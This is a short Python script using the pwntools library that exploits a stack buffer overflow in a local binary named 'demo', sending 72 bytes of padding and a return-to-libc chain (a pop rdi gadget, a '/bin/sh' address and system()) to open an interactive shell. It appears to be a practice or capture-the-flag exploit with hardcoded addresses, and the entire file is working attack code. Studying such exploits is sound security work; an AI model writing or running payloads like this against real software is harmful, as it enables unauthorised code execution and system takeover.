#!/usr/bin/env python3

from pwn import *

p = process("./demo")

def local_exploit():
    rip_offset = 72
    rip_padding = b"A" * rip_offset

    pop_rdi = p64(0x4011d3)
    bin_sh = p64(0x7ffff7f6bb62)
    system = p64(0x7ffff7e29de0)

    payload = rip_padding
    payload += pop_rdi
    payload += bin_sh
    payload += system

    p.sendline(payload)
    p.interactive()

local_exploit()

